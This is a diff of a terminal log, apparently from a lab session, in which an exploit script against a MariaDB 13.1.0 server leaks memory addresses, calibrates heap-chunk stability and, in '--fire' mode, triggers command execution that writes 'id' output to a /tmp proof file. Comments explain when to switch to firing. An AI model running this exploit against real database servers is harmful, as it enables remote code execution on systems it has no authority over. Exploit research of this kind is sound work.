@@ -114,49 +114,63 @@ $ cat /tmp/frm_pwned_t16
 [bat error]: '/tmp/frm_pwned_t16': No such file or directory (os error 2)
 $ python3 lab_exploit.py
 [*] connected (single arena). server ver: 13.1.0-MariaDB
-[*] MB=0x60b8287d5000 LB=0x7eff60c00000
-[*] leaked C(comment_pos)=0x7eff38022c50
-[*] CALIB: re-leaked C2=0x7eff38022c50  stable=True
+[*] MB=0x5e3caed21000 LB=0x7abd8a000000
+[*] leaked C(comment_pos)=0x7abd64022c50
+[*] CALIB: re-leaked C2=0x7abd64022c50  stable=True
 [=] CALIB PASS. dry-run only. re-run with --fire to arm fieldnr=47 and trigger R5.
 $ python3 lab_exploit.py
 [*] connected (single arena). server ver: 13.1.0-MariaDB
-[*] MB=0x60b8287d5000 LB=0x7eff60c00000
-[*] leaked C(comment_pos)=0x7eff3802d7d0
-[*] CALIB: re-leaked C2=0x7eff3802d7d0  stable=True
+[*] MB=0x5e3caed21000 LB=0x7abd8a000000
+[*] leaked C(comment_pos)=0x7abd6402d7d0
+[*] CALIB: re-leaked C2=0x7abd6402d7d0  stable=True
 [=] CALIB PASS. dry-run only. re-run with --fire to arm fieldnr=47 and trigger R5.
 $ python3 lab_exploit.py
 [*] connected (single arena). server ver: 13.1.0-MariaDB
-[*] MB=0x60b8287d5000 LB=0x7eff60c00000
-[*] leaked C(comment_pos)=0x7eff38038d10
-[*] CALIB: re-leaked C2=0x7eff38038d10  stable=True
+[*] MB=0x5e3caed21000 LB=0x7abd8a000000
+[*] leaked C(comment_pos)=0x7abd64038d10
+[*] CALIB: re-leaked C2=0x7abd64038d10  stable=True
 [=] CALIB PASS. dry-run only. re-run with --fire to arm fieldnr=47 and trigger R5.
 $ python3 lab_exploit.py
 [*] connected (single arena). server ver: 13.1.0-MariaDB
-[*] MB=0x60b8287d5000 LB=0x7eff60c00000
-[*] leaked C(comment_pos)=0x7eff38044fd0
-[*] CALIB: re-leaked C2=0x7eff380474d0  stable=False
+[*] MB=0x5e3caed21000 LB=0x7abd8a000000
+[*] leaked C(comment_pos)=0x7abd64044fd0
+[*] CALIB: re-leaked C2=0x7abd640474d0  stable=False
 [!] chunk NOT stable across deliver (C moved) -> ABORT before firing
-$ python3 lab_exploit.py --fire
+$ python3 lab_exploit.py
 [*] connected (single arena). server ver: 13.1.0-MariaDB
-[*] MB=0x60b8287d5000 LB=0x7eff60c00000
-[*] leaked C(comment_pos)=0x7eff3804b8b0
-[*] CALIB: re-leaked C2=0x7eff3804ddb0  stable=False
+[*] MB=0x5e3caed21000 LB=0x7abd8a000000
+[*] leaked C(comment_pos)=0x7abd6404b8b0
+[*] CALIB: re-leaked C2=0x7abd6404ddb0  stable=False
 [!] chunk NOT stable across deliver (C moved) -> ABORT before firing
+
 # [!!!!!] This is the interval during which the `comment_pos` buffer stabilizes.
 # The address of `C` from the previous step is the same as the address of `C` in the step where the exploit succeeded.
 # Since this may vary depending on the server configuration,
 # if the `C` address remains consistent when you run the program without the `--fire` variable, switch to `--fire` mode and run it again.
-$ python3 lab_exploit.py --fire
+
+$ python3 lab_exploit.py
 [*] connected (single arena). server ver: 13.1.0-MariaDB
-[*] MB=0x60b8287d5000 LB=0x7eff60c00000
-[*] leaked C(comment_pos)=0x7eff380517e0
-[*] CALIB: re-leaked C2=0x7eff38051cd0  stable=False
+[*] MB=0x5e3caed21000 LB=0x7abd8a000000
+[*] leaked C(comment_pos)=0x7abd640517e0
+[*] CALIB: re-leaked C2=0x7abd64051cd0  stable=False
 [!] chunk NOT stable across deliver (C moved) -> ABORT before firing
+$ python3 lab_exploit.py
+[*] connected (single arena). server ver: 13.1.0-MariaDB
+[*] MB=0x5e3caed21000 LB=0x7abd8a000000
+[*] leaked C(comment_pos)=0x7abd64051cd0
+[*] CALIB: re-leaked C2=0x7abd64051cd0  stable=True
+[=] CALIB PASS. dry-run only. re-run with --fire to arm fieldnr=47 and trigger R5.
+$ python3 lab_exploit.py
+[*] connected (single arena). server ver: 13.1.0-MariaDB
+[*] MB=0x5e3caed21000 LB=0x7abd8a000000
+[*] leaked C(comment_pos)=0x7abd64051cd0
+[*] CALIB: re-leaked C2=0x7abd64051cd0  stable=True
+[=] CALIB PASS. dry-run only. re-run with --fire to arm fieldnr=47 and trigger R5.
 $ python3 lab_exploit.py --fire
 [*] connected (single arena). server ver: 13.1.0-MariaDB
-[*] MB=0x60b8287d5000 LB=0x7eff60c00000
-[*] leaked C(comment_pos)=0x7eff38051cd0
-[*] CALIB: re-leaked C2=0x7eff38051cd0  stable=True
+[*] MB=0x5e3caed21000 LB=0x7abd8a000000
+[*] leaked C(comment_pos)=0x7abd64051cd0
+[*] CALIB: re-leaked C2=0x7abd64051cd0  stable=True
 [*] arming fieldnr=47, delivering weapon, triggering R5 (execve). cmd='id > /tmp/frm_pwned_t16 2>&1; echo PWNED_$(id -u) >> /tmp/frm_pwned_t16'
 [*] trigger raised (expected on execve): OperationalError(2013, 'Lost connection to MySQL server during query')
 [*] fired. check /tmp/frm_pwned_t16 for proof.
